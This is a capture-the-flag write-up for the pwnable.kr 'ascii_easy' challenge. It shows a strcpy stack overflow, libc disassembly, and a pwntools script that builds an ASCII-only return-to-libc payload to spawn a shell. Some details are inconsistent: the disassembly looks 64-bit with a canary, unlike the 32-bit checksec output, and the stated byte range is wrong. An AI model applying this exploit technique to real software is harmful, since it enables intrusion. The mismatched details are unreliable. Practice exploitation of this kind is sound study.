
We often need to make 'printable-ascii-only' exploit payload.  You wanna try?

hint : you don't necessarily have to jump at the beggining of a function. try to land anyware.


ssh ascii_easy@pwnable.kr -p2222 (pw:guest)
```command
Reading symbols from ./a.out...
(No debugging symbols found in ./a.out)
gdb-peda$ set args "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
gdb-peda$ run
Starting program: /home/harry/pwnble/ascii/a.out "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
triggering bug...
*** stack smashing detected ***: terminated

Program received signal SIGABRT, Aborted.

```c
Scope:

```command
ascii_easy@pwnable:~$ checksec --file ./ascii_easy
[*] '/home/ascii_easy/ascii_easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
ascii_easy@pwnable:~$ 
```

Not much secuirty on this one :S 

Lets look at the code 


```cpp
 #include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000) //we need this address 

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY); //ROP I reconise this from a different ctf challenge 
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);
    }

```

So we need this file, I tried to directly navigate to the location but sudo is banned. 

Quick way:
google the file (hopefully we can get it) 
https://github.com/libcdb/ubuntu/blob/master/libc/libc6_2.15-0ubuntu20_amd64/lib/x86_64-linux-gnu/libc-2.15.so 

```command
ROPgadget --binary libc-2.15.so >> rop.txt
```

The gadget method is way to many stages by the looks of things, I would need to write some script to pull some chains etc. 


sooo.......

```command

ascii_easy@pwnable:~$ objdump -d libc-2.15.so | grep execve
   3edab:	e8 30 98 07 00       	call   b85e0 <execve@@GLIBC_2.0>
000b85e0 <execve@@GLIBC_2.0>:
   b8616:	77 0b                	ja     b8623 <execve@@GLIBC_2.0+0x43>
   b8631:	eb e5                	jmp    b8618 <execve@@GLIBC_2.0+0x38>
000b8640 <fexecve@@GLIBC_2.0>:
   b8684:	0f 84 7e 00 00 00    	je     b8708 <fexecve@@GLIBC_2.0+0xc8>
   b8691:	75 75                	jne    b8708 <fexecve@@GLIBC_2.0+0xc8>
   b8695:	74 71                	je     b8708 <fexecve@@GLIBC_2.0+0xc8>
   b86c4:	e8 17 ff ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b86f2:	74 0c                	je     b8700 <fexecve@@GLIBC_2.0+0xc0>
   b8703:	eb 10                	jmp    b8715 <fexecve@@GLIBC_2.0+0xd5>
   b876a:	e8 71 fe ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b8802:	e8 d9 fd ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b88c9:	e8 12 fd ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b8967:	e8 74 fc ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b8a32:	e8 a9 fb ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b8c1b:	e8 c0 f9 ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b8cda:	e8 01 f9 ff ff       	call   b85e0 <execve@@GLIBC_2.0> <-------- Here Base funcion is called at 
   b8e01:	e8 da f7 ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   b8ea8:	e8 33 f7 ff ff       	call   b85e0 <execve@@GLIBC_2.0>
   d8b77:	e8 64 fa fd ff       	call   b85e0 <execve@@GLIBC_2.0>
   d8eb5:	e8 26 f7 fd ff       	call   b85e0 <execve@@GLIBC_2.0>
   d91ae:	e8 2d f4 fd ff       	call   b85e0 <execve@@GLIBC_2.0>
   da486:	e8 55 e1 fd ff       	call   b85e0 <execve@@GLIBC_2.0>
ascii_easy@pwnable:~$ 

```


So er have the #define BASE ((void*)0x5555e000)  defined we need this somehow. I need to call execve. this is proving to be annoying. 


Lets dump the vuln functio and see what we get:
```cpp
void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}
```

```command
gdb-peda$ pdisas vuln
Dump of assembler code for function vuln:
   0x000055555555522e <+0>:	endbr64 
   0x0000555555555232 <+4>:	push   rbp
   0x0000555555555233 <+5>:	mov    rbp,rsp
   0x0000555555555236 <+8>:	sub    rsp,0x30
   0x000055555555523a <+12>:	mov    QWORD PTR [rbp-0x28],rdi
   0x000055555555523e <+16>:	mov    rax,QWORD PTR fs:0x28
   0x0000555555555247 <+25>:	mov    QWORD PTR [rbp-0x8],rax
   0x000055555555524b <+29>:	xor    eax,eax
   0x000055555555524d <+31>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x0000555555555251 <+35>:	lea    rax,[rbp-0x20]
   0x0000555555555255 <+39>:	mov    rsi,rdx
   0x0000555555555258 <+42>:	mov    rdi,rax
   0x000055555555525b <+45>:	call   0x5555555550b0 <strcpy@plt>
   0x0000555555555260 <+50>:	nop
   0x0000555555555261 <+51>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555555265 <+55>:	xor    rax,QWORD PTR fs:0x28
   0x000055555555526e <+64>:	je     0x555555555275 <vuln+71>
   0x0000555555555270 <+66>:	call   0x5555555550e0 <__stack_chk_fail@plt>
   0x0000555555555275 <+71>:	leave  
   0x0000555555555276 <+72>:	ret    
End of assembler dump.
```
```command

ascii_easy@pwnable:~$ strings -tx libc-2.15.so | grep "error"
   d3ff error_one_per_line
   d44d __assert_perror_fail
   ddd2 clnt_spcreateerror
   e396 regerror
   eab5 clnt_perror
   f46c _IO_ferror
   fc8c __strerror_r
   ff7f strerror_l
  103ca clnt_sperror
  105d3 __libc_dl_error_tsd
  106b6 clnt_pcreateerror
  10c83 error_print_progname
  11263 error_message_count
  112fb herror
  119ab hstrerror
  12094 error_at_line
  121ca ferror_unlocked
  12291 argp_error
  12a69 gai_strerror
  12b13 __xpg_strerror_r
 159c4a Coprocessor error <----- Here
 159c5c Internal stack error
 159df7 Object-specific hardware error
 159f86 I/O error
 15b142 System error
 15cbeb Failed (unspecified error)
 15cd5e RPC: Authentication error
 15cded RPC: Remote system error
 15ce63 RPC: Failed (unspecified error)
 15d63f Unexpected error.
 15dac5 Input/output error
 15db09 Exec format error
 15df3d Advertise error
 15df4d Srmount error
 15df5b Communication error on send
 15df77 Protocol error
 15df99 RFS specific error
 15e007 Streams pipe error
 15e242 Remote I/O error
 15e361 Bus error
 15eba4 Unknown error
 15ebb2 Unknown error 
 15ebff xpg-strerror.c
 15ec0e __xpg_strerror_r
 15f54b error == 1
 15fb29 Resolver internal error
 15fb41 Unknown resolver error
 15fb58 Resolver Error 0 (no error)
 15fb9a Unknown server error
 160522 RPC: (unknown error code)
 1614b8 %s%s%s:%u: %s%sUnexpected error: %s.
 1652f0 clnt_raw.c: fatal header serialization error
 1654b8 %s: %s; why = (unknown authentication error - %d)
```
With this command we can see that we have the 0x5555e000 execeve address. 
The value should be between the values of 0x20 - 0xf7 this then is the kind of rop chain we are calling. 


```pyhton 
from pwn import *
execve = p32(0x5561676a)
rpc = p32(0x556c3343)
pointer = p32(0x556a583c)
param = "A"*32
param += execve
param += rpc
param += pointer
param += pointer

p = process(['/home/ascii_easy/ascii_easy', param])

p.interactive()
```

This took way to long to figure out
